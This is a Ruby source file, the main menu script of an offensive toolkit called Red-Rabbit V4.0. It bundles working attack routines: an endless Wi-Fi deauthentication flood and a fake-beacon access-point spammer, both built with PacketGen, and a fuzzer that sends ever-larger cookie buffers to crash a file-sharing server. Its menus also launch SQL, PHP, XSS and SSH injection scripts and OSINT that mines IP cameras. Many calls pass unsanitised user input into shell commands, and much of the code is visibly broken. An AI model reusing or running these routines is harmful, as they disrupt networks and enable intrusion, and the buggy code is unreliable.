#authord: this is the og work of RE43P3R/ArkAngel
#contrib: contribution goes tom my handy dandy hacker freinds who gave me the broken PHPI and SQLI scripts so i can fix and use wanted to remember anon 
# list of things it can do 
# PHPI, SQLI, XSSI, Ajax crawl, ajaz crawl + whois, whois, domain dorker, payload, xss scan, sql scan, ftp scan, port scan, web scan, dhcmp scan, web host scan, whois trace, whois mine, spawn fake ap's, scan local ports, scan the local host, fuzz a file app, web app fuzz, flood a host, scan the local area for bssid's, deauthenticate networks, activate interfaces, grab code notes in html, grab urls in a html file, dive in html, parse html, run MOAB osint, nuke a domain, view my website,  run osint on complex urls 
#langs: 
# golang, rust, html, css, js, ruby, python, Perl, Tex, makefile, raku, c, Assembly, cross platform assembly, bash, batch, txt, other 


print"\x1b[H\x1b[2J\x1b[3J"
require 'tty-spinner'

#for some reason it wasnt working or formatting with three requirements 


def wincat
    puts '[+] Loading Readme file'
    puts '''
    this tool is inspired by one of my first ruby frameworks 
    for ethical hacking and web/host discovery
    that tool was named Rube-Ster which had alot 
    of bugs and a shit ton of work that was thrown 
    to the side, so i decided to start this project 
    which is well Red-Rabbit, you may ask where 
    did the name come from, well initally Rube-Sters 
    name cam from ruby hence the Rube- and the ster 
    came from a bunny i used to know and it was named mr booster
    sadly he passed away, anyway hence the name ster
    then red rabbit which is a name derived from the og name 


    ================
    Why this tool? 
    ===============

    this tool has alot of options now for choices such as 

    wifi Death, Fake AP, web port scanners, host port scanners 
    dns, whois, loggers, banner and title parsers, and is written 
    from mainly ruby however utilizes, perl, rust, go, ruby, bash, and batch 
    you will notice batch is for win32-64 installs and bash is used for linux installs 



    =====================
    why so many languages 
    =====================
    well i wanted speed, and since i am currently learning 
    rust, c, perl, ruby, go, and batch i decided to put 
    my skills to the very well known test 

    i also wanted speed 

    to parse the results of a title of the domain
    and to grab it faster i used golang 

    Go -> go-title.go

    i also wanted better exception handeling and easy 
    etsting, especially with net/http parsing and result testing 
    '''
    print """
    so i used perl so i can throw the URl's into a list, parse them 
    and get faster results for testing a internet or stable connections 
    perl is also really good for formatting 

    i wanted it to somehwta be cross platform 

    so i used bash and batch for the installs 

    ==========
    why rust?
    ===========

    simply for faster current network host identification 

    ====================
    why rust IP sniffing?
    ====================

    rust is really fast and a really good language compared to golang 
    sure golang is built from assembly but rust over all is faster 
    when it comes to handeling, socks, networking threadings and more 
    so i built a small IP sniffer from rust 

    ============================================================
    why make the main file in ruby if other languages are faster
    ============================================================ 

    well currently im reading a few books with ruby, and wanted to put 
    my ruby skills to the test to see my limits, and ruby is alot better 
    when it comes to offensive security tools with networking and sending
    payloads over the network or even making something like a windows 
    trojan, so i decided to use it 

    if your still confused and want to debate then ask yourself 

    why is the biggest exploitation framework and the most powerful (MSF/metasploit)
    is 97% built from pure ruby? ''
    =================================== what can this tool do ======================

    spawn fake ap's
    deauthenticate clients off a network 
    do whois domain tracing 
    reverse a dns
    launch DHCMP attacks 
    Flood networks 
    Port Scan Hosts 
    Port Scan Web Hosts 
    IP Parse 
    Find ports on the local network 
    check your current connection 
    Scan the local area for BSSID's and ranges ( its unorganized )
    Fuzz File Sharing Websites ( crash and exploit the servers )
    Arp Spoof Clients off the current network 
    AP scan 




    =============================== REQUIREMENTS ========================
    perl
    python 
    rust 
    rustc
    crates 
    cargo 
    cpan 
    ruby
    bash or batch 
    golang 

    service/script REQUIREMENTS for modules 

    ruby ===

    net/http
    socket 
    time 
    awaite
    optparse 
    iw phy
    timeout 
    http party 
    open uri
    uri
    whois 
    whois-parser
    colorize
    tty-spinner
    ruby-gems 
    openssl

    Go ====

    a fucking os 
    a sys 
    fmt 
    strings 
    net/http
    net/html 

    perl === 
    Ansi color 
    socket 
    Strict 
    HTTP Tiny

    rust === 
    use std::env;
    use std::process::Command;
    use std::io::{self, Write};
    use std::net::{IpAddr, TcpStream};
    use std::str::FromStr;
    use std::process;
    use std::sync::mpsc::{Sender, channel};
    use std::thread;


    =============================== WARNINGS ====================

    ME OR ANYONE WHO CONTRIBUTED OR GAVE IDEAS ARE 
    RESPONSIBLE FOR YOUR DUMBASS MAKING DUMBASS DECISIONS 
    WE HIGHLY DISCLAIM AGAINST USING THIS TOOL FOR MALICOUS 
    ACTIVITY IF YOU HAVE A PROBLEM 

    sudo rm -rf user /usr/share/fuckyourself
    """
    end
def CS(x)
    sleep(x)
    print"\x1b[H\x1b[2J\x1b[3J"
end
def checkmain
    def check
        begin
            puts '[~] Checking Mods Before Run'
            require 'colorize'
            spinner = TTY::Spinner.new("[:spinner] Checking Module ...", format: :pulse_2)
            spinner.auto_spin 
            sleep(0.1) 
            spinner.stop("Done!") 
            puts '[✅️] Module Found'
        rescue LoadError
            raise "[❌️] Seems you do not have a module "
            puts  "[X] MODULE NOT FOUND"
            exit!
        end 
        require 'packetgen'
        spinner = TTY::Spinner.new("[:spinner] Checking Module ...", format: :pulse_2)
        spinner.auto_spin 
        sleep(0.1) 
        spinner.stop("Done!") 
        puts '[✅️] Module Found'
        rescue LoadError
            raise "[X] You DO NOT have this module, but why?"
            puts  "[X] MODULE NOT FOUND"
            exit!
        end
    def check1
        begin
            require 'whois-parser'
            spinner = TTY::Spinner.new("[:spinner] Checking Module ...", format: :pulse_2)
            spinner.auto_spin 
            sleep(0.1) 
            spinner.stop("Done!") 
            puts '[✅️] Module Found'
            rescue LoadError
            raise "[❌️] Seems you do not have a module "
            puts  "[X] MODULE NOT FOUND"
            exit!
            end 
            require 'whois'
            spinner = TTY::Spinner.new("[:spinner] Checking Module ...", format: :pulse_2)
            spinner.auto_spin 
            sleep(0.1) 
            spinner.stop("Done!") 
            puts '[✅️] Module Found'
            rescue LoadError
            raise "[X] You DO NOT have this module, but why?"
            puts  "[X] MODULE NOT FOUND"
            exit!
            end
    def check2
        begin
            require 'optparse'
            spinner = TTY::Spinner.new("[:spinner] Checking Module ...", format: :pulse_2)
            spinner.auto_spin 
            sleep(0.1) 
            spinner.stop("Done!") 
            puts '[✅️] Module Found'
            rescue LoadError
            raise "[❌️] Seems you do not have a module "
            puts  "[X] MODULE NOT FOUND"
            exit!
            end 
            require 'httparty'
            spinner = TTY::Spinner.new("[:spinner] Checking Module ...", format: :pulse_2)
            spinner.auto_spin 
            sleep(0.1) 
            spinner.stop("Done!") 
            puts '[✅️] Module Found'
            rescue LoadError
            raise "[X] You DO NOT have this module, but why?"
            puts  "[X] MODULE NOT FOUND"
            exit!
            end
    def check3
        begin
            require 'net/http'
            spinner = TTY::Spinner.new("[:spinner] Checking Module ...", format: :pulse_2)
            spinner.auto_spin 
            sleep(0.1) 
            spinner.stop("Done!") 
            puts '[✅️] Module Found'
            rescue LoadError
            raise "[❌️] Seems you do not have a module "
            puts  "[X] MODULE NOT FOUND"
            exit!
            end 
            require 'uri'
            spinner = TTY::Spinner.new("[:spinner] Checking Module ...", format: :pulse_2)
            spinner.auto_spin 
            sleep(0.1) 
            spinner.stop("Done!") 
            puts '[✅️] Module Found'
            rescue LoadError
            raise "[X] You DO NOT have this module, but why?"
            puts  "[X] MODULE NOT FOUND"
            exit!
            end
    def check4
        begin
            require 'open-uri'
            spinner = TTY::Spinner.new("[:spinner] Checking Module ...", format: :pulse_2)
            spinner.auto_spin 
            sleep(1) 
            spinner.stop("Done!") 
            puts '[✅️] Module Found'
            rescue LoadError
            raise "[❌️] Seems you do not have a module "
            puts  "[X] MODULE NOT FOUND"
            exit!
            end 
            require 'rubygems'
            spinner = TTY::Spinner.new("[:spinner] Checking Module ...", format: :pulse_2)
            spinner.auto_spin 
            sleep(1) 
            spinner.stop("Done!") 
            puts '[✅️] Module Found'
            rescue LoadError
            raise "[X] You DO NOT have this module, but why?"
            puts  "[X] MODULE NOT FOUND"
            exit!
            end                
    def check4
        #gem 'net-ssh'
        begin
            require 'rubygems'
            spinner = TTY::Spinner.new("[:spinner] Checking Module ...", format: :pulse_2)
            spinner.auto_spin 
            sleep(1) 
            spinner.stop("Done!") 
            puts '[✅️] Module Found'
            rescue LoadError
            raise "[❌️] Seems you do not have a module "
            puts  "[X] MODULE NOT FOUND"
            exit!
            end 
        end
    end

require 'colorize'
require 'packetgen'
require 'socket'
require 'open-uri'
require 'rubygems'
require 'timeout'
require 'net/http'
require 'whois'
require 'whois-parser'
require 'socket'
require 'net/ssh'
require 'colorize'
require 'tty-spinner'
require 'optparse'
require 'httparty'
require 'timeout'
require 'uri'
require 'openssl'
#apt install libpcap-dev
#gem install packetgen
#iw phy phy1 interface add mon0 type monitor && ifconfig mon0 up




print"\x1b[H\x1b[2J\x1b[3J"

def clear
    print"\x1b[H\x1b[2J\x1b[3J"
end

def win_check
    if RUBY_PLATFORM =~ /win32/
        puts "You seem to be on windows".colorize(:red)
        puts "Note that you may not have the best experience".colorize(:red)
        print " Would you like to continue Yn >>> "
        yn = gets.chomp
        if yn == 'Y'
            #nothing
        end
        if yn == 'n'
            exit!
        end
    end
end


win_check()

def os
    if RUBY_PLATFORM =~ /win32/
        puts "                                          Detected Os ->  Windows".colorize(:blue)
      elsif RUBY_PLATFORM =~ /linux/
        puts "                                          Detected Os ->  Linux".colorize(:blue)
      elsif RUBY_PLATFORM =~ /darwin/
        puts "                                          Detected Os -> Mac OS X".colorize(:blue)
      elsif RUBY_PLATFORM =~ /freebsd/
        puts "                                          Detected Os -> FreeBSD".colorize(:blue)
      else
        puts "                                          Detected Os -> is unknown".colorize(:blue)
      end
    end

def file_fuzz
    print(" Host IP >>> ")
    host   = gets.chomp || "127.0.0.1"
    puts '--------------'
    puts 'Defualt || 80 '
    print(" Port >>> ")
    port   = gets.chomp || 80
    fuzz   = 40     
    buffer = "A"
    def send_post(host, port, buffer)
        puts "[~] SENDING GET REQ WITH A BUFFER OF -> #{buffer.size} bytes"
        begin
            request = "GET /vfolder.ghp HTTP/1.1\r\n"
            request += "Cookie: SESSIONID=9999; UserID=PassWD=" + buffer + "; frmUserName=; frmUserPass=;\r\n"
            request += "Connection: keep-alive\r\n\r\n"
            s = TCPSocket.open(host, port)
            s.send(request, 0)
            s.close
        rescue Errno::ECONNREFUSED
            puts "[!] Server isnt running or crashed".colorize(:red)
            exit!
        rescue Errno::ECONNRESET
            puts "[!] SERVER HAS CRASHED WITH --> #{buffer.size}-bytes".colorize(:red)
            puts "[!] Targeted Server -> #{host} On Port -> #{port}".colorize(:red)
            exit!
        end
    end
    fuzz.times {|n| send_post(host, port, (buffer += buffer * n)) ; sleep 0.2}
end

def serverwhois
    whois = Whois::Client.new
    whois.lookup("#{dom}")
    record = Whois.whois("#{dom}")
    parser = record.parser
    register = parser.registered?
    created = parser.created_on 
    main = parser.technical_contacts.first
    puts '[~] Name-Servers [~]'.colorize(:blue)
    parser.nameservers.each do |nameserver|
        puts '[+] -> '.colorize(:red) + "#{nameserver}".colorize(:blue)
    end
end


def moab
    print"\x1b[H\x1b[2J\x1b[3J"
    puts 'EX: http://parrot-pentest.com'
    puts "----------------------------------------".colorize(:blue)
    print "Domain Name >>> "
    dom = gets.chomp
    puts '----------------------------------------'.colorize(:blue)
    puts 'EX: http://www.parrot-pentest.com'
    puts "----------------------------------------".colorize(:blue)
    print "http URL    >>> "
    url = gets.chomp
    puts "--------------- Last form type "
    puts "  EX: www.parrot-pentest.com"
    print " www for port >>> "
    domain1 = gets.chomp
    system("cd MOAB-OSINT ; chmod +x ./beta-parrot-recon.sh ; sudo ./beta-parrot-recon.sh #{dom} #{url} #{domain1}")    
end


def phpipl
    print " host >>"
    hos = gets.chomp
    print " PHP vulnerability >>> "
    phv = gets.chomp
    print " URI >>> "
    ui = gets.chomp
    system("cd injection ; perl php-injection -h #{hos} -i #{phv} -u #{ui}")
end

def sqli22pl
    print "URL Host >>>"
    ul = gets.chomp 
    print "URL IP   >>> "
    ho = gets.chomp
    system("cd injection ; perl sqli.pl -u #{ul} -h #{ho}")
end

def xssi()
    system("python3 xssi.py ")
end

def godork()
    print "Url to google dork >>> "
    ul = gets.chomp
    system("cd MOAB-OSINT ; chmod +x ./osint-con.sh ; sudo ./osint-con.sh #{ul}")
end

def goyl()
    system("cd go-serve ; go run go-serve.go")
end

def wenotlib
    puts """
    ANYONE WHO CONTRIBUTED OR WROTE THIS SOFTWARE ARE NOT HELD LIABLE FOR YOUR ACTIONS 

    YOU ARE NOT PREMITTED TO COPY THIS WORK AND CALL IT YOURS 
    AND WE CERTIANLY ARE AGAINST ANYONE USING THIS FRAMEWORK 
    FOR MALICOUS ACTIVITY, ME, AND ANY OTHER DEVELOPERS OF 
    SOME AUTOMATION SCRIPTS ARE NOT HELD ACCOUNTABLE FOR THE 
    DUMB DESCISIONS YOU MAKE, IF YOU WANT TO SEE CHECK THE 
    LICENSE 

    RED-RABBIT VERSION 4.0 IS UNER THGE GNU AFFERO GENERAL PUBLIC LICENSE VERSION 3 

    HAVE FUN 
    DONT BE A DUMBASS 
    RESPECT OTHER PEOPLES PRIVACY 
    AND FOLLOW BUSHIDO CODE
    """
end

def uses()
    puts """
    
    Red-Rabbit V4.0 is under the GNU AFFERO GENERAL PUBLIC LICENSE V3

    you are not premitted to change any form of this code and pass it off as your own 
    do NOT be an asshole
    

    ----------------------
    Sell > yes 
    copywrite > NO
    redistribute > yes
    make changed > NO 
    ============================ what is this scipt for or what can it do> =====================
        Red Rabbit Version 4 can do alot such as explained in the docs

        sqli 
        phpi 
        xssi 
        host scan 
        host port scan 
        web port scan 
        web domain osint 
        MOAB osint 
        Complex url hunting 
        google dorking URL 
        grabbign code notes 
        grab server X info 
        spawn fake ap's 
        run host dos 
        run deauth 
        arp scan 
        scan local macs 
        and much more 
    """

    end

def Warnings()
    puts """
    Warnings about this script
    --------------------------

    PHP injection |
    the PHP injection script utilizes a very old language and was written by an old friend of mine who wanted me to fix it, i do not claim ownership of this script as we decided 90/10% on it which is fair 
    this script is a very broken script with alot of bugs and may not be improoved in the future 
    bugs like
    connection will fail 
    host isnt defined right 
    wont be able to inject 
    etc etc etc 


    ---------


    SQL injection | 
    this script was written from perl as well and will have issues with connecitng to the database, pulling information, and some others that have not been quite understood yet 
    this will be improoved as well in older and newer versions of red rabbit like the upcoming Version 5.10


    ----------
    fake ap 
    fake ap will mostly just be issues with the interface as exclaimed in the documentation 


    ----------
    rust scan 

    slow recon, yes i know this is a very slow script this is because threading was not a inital thought on release 

    ----------
    MOAB 

    you will need to repeat your url over 3 times if you use MOAB of osint 
    """
    print "Return [Y/n] > "
    x = gets.chomp
    if x == 'Y'
        CS(1)
        fourthmen()
    end
    if x == 'n'
        puts "[-] Exit...."
    end
end

def lic()
    system("cd license-etc ; cat LICENSE")
end

def ftpbrute
    print "Remote Host >>> "
    rhost = gets.chomp
    print "Username    >>> "
    user  = gets.chomp  
    print "Wordlist    >>> "
    wordlist = gets.chomp
    def target()
        dt = DateTime.now
        puts "[*] Checking con......"
        begin
            sock = Socket.new Socket::AF_INET, Socket::SOCK_STREAM
            addr = Socket.pack_addr_in(21, "#{rhost}")
            timeout(10) do
                @result = s.connect(sockaddr)
            end
            sock.close
            if @result == 0
                puts "[*] Brute Finished At "
                puts dt.next_month.strftime(" \033[36m[\033[35m%H:%M\033[36m] ")
            else
                raise "Connection seems to have been refused, check your hostname"
            end
        rescue
            puts "Broken con?"
            exit!
        end
    end
end
   
def ftpmen
    system("cd thirdmen ; go run thirdmen.go")
    puts '                                           ['.colorize(:red)+'1'.colorize(:blue)+']'.colorize(:red)+'Hex-Dump      '.colorize(:red)
    puts '                                           ['.colorize(:red)+'2'.colorize(:blue)+']'.colorize(:red)+'FTP-Sniffer   '.colorize(:red)
    puts '                                           ['.colorize(:red)+'3'.colorize(:blue)+']'.colorize(:red)+'Parrot-Recon  '.colorize(:red)
    print "                                      >>> ".colorize(:red)
    opt = gets.chomp
    if opt == '3'
        puts "EX: http://parrot-pentest.com".colorize(:red)
        puts "----------------------------------------".colorize(:blue)
        print "Domain Name >>>"
        domain = gets.chomp
        puts "EX: http://parrot-pentest.com".colorize(:red)
        puts "----------------------------------------".colorize(:blue)
        print "Http URL >>> "
        url = gets.chomp
        puts "EX: www.parrot-pentest.com".colorize(:red)
        puts "----------------------------------------".colorize(:blue)
        www = gets.chomp
        system("cd MOAB-OSINT ; chmod +x ./parrot-recon-sub-main.sh ; ./parrot-recon-sub-main.sh #{domain} #{url} #{www}")
    end
    if opt == '1'
        system("go run hex.go ")
    end
    if opt == '2'
        system("cd FTP ; sudo ftp-sniffer.rb")
    end
end

def osimen
    system("cd thirdmen ; go run thirdmen.go")
    puts '                                           ['.colorize(:red)+'1'.colorize(:blue)+']'.colorize(:red)+'Phone OSINT'.colorize(:red) #done
    puts '                                           ['.colorize(:red)+'2'.colorize(:blue)+']'.colorize(:red)+'Phone OSINT (US ONLY)  '.colorize(:red) #done 
    puts '                                           ['.colorize(:red)+'3'.colorize(:blue)+']'.colorize(:red)+'User-Search '.colorize(:red) #done 
    puts '                                           ['.colorize(:red)+'4'.colorize(:blue)+']'.colorize(:red)+'IP Tracer'.colorize(:red) #done 
    puts '                                           ['.colorize(:red)+'5'.colorize(:blue)+']'.colorize(:red)+'Discord OSINT framework'.colorize(:red) #TODO
    puts '                                           ['.colorize(:red)+'6'.colorize(:blue)+']'.colorize(:red)+'Mine IP Cameras'.colorize(:red)#done
    puts '                                           ['.colorize(:red)+'7'.colorize(:blue)+']'.colorize(:red)+'Mine Twitter Chats'.colorize(:red)#done  
    puts '                                           ['.colorize(:red)+'g'.colorize(:blue)+']'.colorize(:red)+'FTP and more -> '.colorize(:red)
    puts '                                           ['.colorize(:red)+'8'.colorize(:blue)+']'.colorize(:red)+' <- back '#done
    print "                                      >>> ".colorize(:red)
    opt = gets.chomp
    if opt == 'g' 
        ftpmen()
    end
    if opt == '8'
        fourthmen()
    end
    if opt == '7'
        system("cd osing-modules ; python3 twitter.py")
    end
    if opt == '6'
        system("cd osing-modules ; python3 camera.py")
    end
    if opt == '5'
        system("cd osing-modules ; cd DIS-Sniper ; python3 main.py")
    end
    if opt == '4'
        system("cd osing-modules ; python3 ip.py ")
    end
    if opt == '3'
        puts """
        
        please input the following command 
        cd osing-modules ; chmod +x ./user.sh ; ./user.sh

        due to the bash formatting if this is run inside of #{__FILE__}

        """.colorize(:yellow)
        exit!
    end
    if opt == '2'
        print "Number [US] >>> "
        num = gets.chomp 
        system("cd osing-modules ; chmod +x ./phone-us.sh ; ./phone-us.sh --num #{num} --csv")
    end
    if opt == '1'
        system("cd osing-modules ; python3 num.py ")
    end
end

def fourthmen()
    system("cd thirdmen ; go run thirdmen.go")
    puts '                                           ['.colorize(:red)+'1'.colorize(:blue)+']'.colorize(:red)+'Warnings  '.colorize(:red) #done
    puts '                                           ['.colorize(:red)+'2'.colorize(:blue)+']'.colorize(:red)+'Uses  '.colorize(:red) #done 
    puts '                                           ['.colorize(:red)+'5'.colorize(:blue)+']'.colorize(:red)+'WE ARENT LIABLE '.colorize(:red) #done 
    puts '                                           ['.colorize(:red)+'3'.colorize(:blue)+']'.colorize(:red)+'Licensing [Mon 18 Oct 2021 07:18:50 PM] '.colorize(:red) #done 
    puts '                                           ['.colorize(:red)+'X9'.colorize(:blue)+']'.colorize(:red)+'People OSINT'.colorize(:red) #TODO
    puts '                                           ['.colorize(:red)+'X8'.colorize(:blue)+']'.colorize(:red)+'Browser'.colorize(:red)#done
    puts '                                           ['.colorize(:red)+'X7'.colorize(:blue)+']'.colorize(:red)+'Start a service '.colorize(:red)#done  
    puts '                                           ['.colorize(:red)+'X'.colorize(:blue)+']'.colorize(:red)+' <- back '#done
    print "                                      >>> ".colorize(:red)
    thin = gets.chomp 
    if thin == 'X9' or thin == 'x9'
        CS(1)
        osimen()
    end
    if thin == 'X8'
        CS(1)
        system("cd brow ; cd DBROWSER-V2 ; python3 main.py")
    end
    if thin == 'X7'
        print "Service >>> "
        ser = gets.chomp
        system("sudo service start #{ser}")
    end
    if thin == 'X'
        thirdmen()
    end
    if thin == '1'
        Warnings()
    end
    if thin == '2'
        uses()
    end
    if thin == '5'
        wenotlib()
    end
    if thin == '3'
        lic()
    end
end

def ajaxwitho
    print "URL >>> "
    url = gets.chomp
    system("python3 ajax-without-dom.py #{url}")
end
def ajax
    print "URL >>> "
    url = gets.chomp
    system("python3 snap.py #{url}")
end

def thirdmen()
    system("cd thirdmen ; go run thirdmen.go")
    puts 'Warning | PHPI and SQLI are very old scripts that may or may not work, goodluck'.colorize(:yellow)
    puts '                                           ['.colorize(:red)+'x3'.colorize(:blue)+']'.colorize(:red)+' Ajax Spider with whois -> THIS IS VERY BUGGY '.colorize(:red)
    puts '                                           ['.colorize(:red)+'x4'.colorize(:blue)+']'.colorize(:red)+' Ajax Spider without whois'.colorize(:red) 
    puts '                                           ['.colorize(:red)+'1'.colorize(:blue)+']'.colorize(:red)+'  PHP injection '.colorize(:red) 
    puts '                                           ['.colorize(:red)+'2'.colorize(:blue)+']'.colorize(:red)+'  SQL injection '.colorize(:red) #done 
    puts '                                           ['.colorize(:red)+'5'.colorize(:blue)+']'.colorize(:red)+'  XSS injection '.colorize(:red) #done 
    puts '                                           ['.colorize(:red)+'G0'.colorize(:blue)+']'.colorize(:red)+' SSH injection | Possession '.colorize(:red) #done
    puts '                                           ['.colorize(:red)+'3'.colorize(:blue)+']'.colorize(:red)+'  Google Dork a domain '.colorize(:red) #done 
    puts '                                           ['.colorize(:red)+'B'.colorize(:blue)+']'.colorize(:red)+'  MOAB OSINT Domain '.colorize(:red) #done 
    puts '                                           ['.colorize(:red)+'8'.colorize(:blue)+']'.colorize(:red)+'  Run OSINT on the HTML of a complex URL'.colorize(:red) #done
    puts '                                           ['.colorize(:red)+'C'.colorize(:blue)+']'.colorize(:red)+'  View and open my webisite '.colorize(:red) #done
    puts '                                           ['.colorize(:red)+'9'.colorize(:blue)+']'.colorize(:red)+'  <- Back'.colorize(:red) #done
    puts '                                           ['.colorize(:red)+'?'.colorize(:blue)+']'.colorize(:red)+'  Extra ->  '.colorize(:red) #done
    print "                                      >>> ".colorize(:red)
    thin = gets.chomp 
    if thin == 'G0' or thin == 'GO'
        print "ssh device name >>> "
        dev = gets.chomp
        print "ssh device IPA >>> "
        ip = gets.chomp
        print "ssh device pass >>> "
        pass = gets.chomp
        system("cd ssh-sploit ; ruby ssh-sploit.rb #{dev} #{ip} #{pass}")
    end
    if thin == 'x4'
        ajaxwitho()
    end
    if thin == 'x3'
        ajax()
    end
    if thin == '?'
        fourthmen()
    end
    if thin == '1'
        phpipl()
    end
    if thin == '2'
        sqli22pl()
    end
    if thin == '5'
        xssi()
    end
    if thin == '3'
        godork()
    end
    if thin == '8'
        goyl()
    end
    if thin == '9'
        CS(1)
        extra()
    end
    if thin == 'B'
        moab()
    end
    if thin == 'C' or thin == 'c'
        puts "--------------What browser do you use?-----------------------".colorize(:yellow)
        puts "g = google | f = firefox | b = brave ".colorize(:red)
        print "Op >>>"
        o = gets.chomp
        if o == 'g'
            system("cd web ; chrome open idnex.html")
        end
        if o == 'f'
            system("cd web ; firefox open idnex.html")
        end
        if o == 'b'
            system("cd web ; brave idnex.html")
        end
    end
end


def extra()
     # comming soon 
   system("cd thirdmen ; go run thirdmen.go")
   puts '                                           ['.colorize(:red)+'1'.colorize(:blue)+']'.colorize(:red)+' Wifi Scanner '.colorize(:red)
   puts '                                           ['.colorize(:red)+'2'.colorize(:blue)+']'.colorize(:red)+' Web App Fuzzer '.colorize(:red)
   puts '                                           ['.colorize(:red)+'3'.colorize(:blue)+']'.colorize(:red)+' SQLI Tester '.colorize(:red)
   puts '                                           ['.colorize(:red)+'B'.colorize(:blue)+']'.colorize(:red)+' XSSI Tester '.colorize(:red)
   puts '                                           ['.colorize(:red)+'A'.colorize(:blue)+']'.colorize(:red)+' About (for windows input 99)'.colorize(:red)
   puts '                                           ['.colorize(:red)+'4'.colorize(:blue)+']'.colorize(:red)+' README'.colorize(:red)
   puts '                                           ['.colorize(:red)+'9'.colorize(:blue)+']'.colorize(:red)+' <- Back'.colorize(:red)
   puts '                                           ['.colorize(:red)+'g'.colorize(:blue)+']'.colorize(:red)+' More ->'.colorize(:red)
   print "                                      >>> ".colorize(:red)
   input = gets.chomp
   if input == 'g'
    thirdmen()
   end
   if input == '99'
    wincat()
   end
   if input == '3'
    puts '[+] Starting Script...'.colorize(:red)
    system("sudo python3 sql.py ")
    sleep 5
    puts 'Returning to main'
    print"\x1b[H\x1b[2J\x1b[3J"
    main()
    menu()   
   end
   if input == 'B'
    puts '[+] Starting XSS Tester....'.colorize(:red)
    system("sudo python3 xss.py")
    sleep 2
    print("Return to Menu? Y/n >>> ")
    get1 = gets.chomp
    if get1 == 'Y'
        main()
        menu()
    end
    if get1 == 'n'
        puts '[+] Exiting'
    end
end
   if input == '8'
    thread = "1000"
    puts '[+] Starting Rust Scanner'.colorize(:yellow)
    print("PRIVATE HOSTNAME >>> ")
    hostnamerust = gets.chomp
    puts "Targeting Hostname -> #{hostnamerust}".colorize(:yellow)
    puts '[+] Running My Tool Install'
    system("cd /rust/main/src ; cargo run main.rs #{hostnamerust} ")
    print "Press Enter when you want to continue >>> "
    ine = gets.chomp
    main()
    menu()
   end
   if input == 'A'
    puts '[+] Catting file'.colorize(:yellow)
    system("cat read.txt")
   end
   if input == '2' # file sharing server web app socket fuzzer
    puts '[+] Running Fuzzer'.colorize(:blue)
    file_fuzz()
   end
   if input == '9' #leave 
    puts '{+} Going back...'.colorize(:red)
    print"\x1b[H\x1b[2J\x1b[3J"
    main()
    menu()
   end
   if input == '1'
    puts '[+] Starting Monitor....'.colorize(:yellow)# wifi discovery
    system("sudo python3 wifi.py ")
   end
end

def main
    print"\x1b[H\x1b[2J\x1b[3J"
    system("cd thirdmen ; go run thirdmen.go")
end

def whois
    print"\x1b[H\x1b[2J\x1b[3J"
    puts 'EX: twitter.com'
    print "Domain Name >>> "
    dom = gets.chomp
    puts '---------'
    puts 'EX: http://twitter.com'
    print "http URL    >>> "
    url = gets.chomp
    whois = Whois::Client.new
    whois.lookup("#{dom}")
    record = Whois.whois("#{dom}")
    parser = record.parser
    register = parser.registered?
    created = parser.created_on 
    main = parser.technical_contacts.first
    puts '------------------------------------------------------------------------'.colorize(:yellow)
    puts "[+] Created    : ".colorize(:red) + "#{created}"
    puts "[+] Registered : ".colorize(:red) + "#{register}"
    puts "\n" + "#{main}"
    puts '-------------------------------------------------------------------------'.colorize(:yellow)
    puts " "
    system("ruby dom-t.rb #{url} #{dom}")
    puts '[~] Name-Servers [~]'.colorize(:blue)
    parser.nameservers.each do |nameserver|
        puts '[+] -> '.colorize(:red) + "#{nameserver}".colorize(:blue)
    end
    puts '----------------------URL TO DOMAIN-------------'
    system("go run go-title.go #{url}")
    puts "--------------------------- running back spider ------------------------ "
    system("python3 ajax-without-dom.py #{url} #{dom} ")
end



def webscan
    puts 'Ex www.google.com'
    puts '-------------------'
    print"Target World Wide Web link  ~~> ".colorize(:red)
    www = gets.chomp 
    ipa = IPSocket::getaddress("#{www}")
    puts '______________________________________________'
    puts '[+] Scanning Host ~~> '.colorize(:yellow) + ipa
    puts '[+] Scanning 65,000 Ports'.colorize(:yellow)
    puts '----------------------------------------------'.colorize(:red)
    ports = 1..65389
    ports.each do |scan|
        begin
            Timeout::timeout(0.1){TCPSocket.new(ipa, scan)}
            rescue
                #puts "[PORT] #{scan} IS [CLOSED]"
            else
                dt = DateTime.now
                puts dt.next_month.strftime(" \033[36m[\033[35m%H:%M\033[36m] ") + "\033[35m[\033[36mRED-RABBIT-INF\033[35m] " + "[PORT#{scan}] CAME BACK OPEN"
            end
            #
            rescue Interrupt
                puts '[!] Exiting Scan'
                print "Would you like to go back to the menue Y/n >>> "
                get = gets.chomp
                if get == 'Y'
                    puts '[+] Returning '
                    main()
                    menu()
                end
                if get == 'n'
                    puts '[+] Exiting...'
                    exit!
                end
        end
    end


def hostscan
    print"Target Address ~~> ".colorize(:red)
    ip = gets.chomp 
    ports = 1..65000
    ports.each do |scan|
        begin
            Timeout::timeout(0.1){TCPSocket.new(ip, scan)}
            rescue
                #puts "[PORT] #{scan} IS [CLOSED]"
            else
                dt = DateTime.now
                puts dt.next_month.strftime(" \033[36m[\033[35m%H:%M\033[36m] ") + "\033[35m[\033[36mRED-RABBIT-INF\033[35m] " + "[PORT#{scan}] CAME BACK OPEN"
            end
            #puts '[Finished Scan]'
        end
    end



def deauth
    iface = 'mon0'
    packnum = "100000000000000"
    print("Access Point ~~> ")
    bssid  = gets.chomp
    puts '-----------------------'
    print("Destination  ~~> ")
    client = gets.chomp
    while true
        pkt = PacketGen.gen('RadioTap').
                        add('Dot11::Management', mac1: client, mac2: bssid, mac3: bssid).
                        add('Dot11::DeAuth', reason: 7)
        puts "Sending Defualt Amount  -> " + packnum 
        puts "[+] Sending Deauth Using --> " + iface + ' to Acess Point --> ' + bssid + 'Too Client --> ' + client 
        pkt.to_w(iface, calc: true, number: 100000000000000, interval: 0.2)
    end
end
    

def runcpu()
    system("cd asm ; nasm -f elf32 -o core.o core.asm ; ld -m elf_i386 -o core core.o ; ./core ")
end

def rouge
    iface     = 'mon0'
    broadcast = "ff:ff:ff:ff:ff:ff"
    bssid     = "aa:aa:aa:aa:aa:aa"
    print("Fake SSID Name >>> ")
    ssid      = gets.chomp
    while true
        pkt = PacketGen.gen('RadioTap').add('Dot11::Management', mac1: broadcast, mac2: bssid, mac3: bssid)
                                    .add('Dot11::Beacon', interval: 0x600, cap: 0x401)
        pkt.dot11_beacon.elements << {type: 'SSID', value: ssid}
        pp pkt
        100000.times do
        pkt.to_w(iface)
        remote_ip = URI.open('http://whatismyip.akamai.com').read
        puts '[+] ~~> Using IP    '.colorize(:red) + remote_ip 
        puts '[+] ~~> Fake Beacon '.colorize(:red) + ssid + ' USING ~~> '.colorize(:blue) + iface
        end
    end
end

def menu()
    os()
    runcpu()
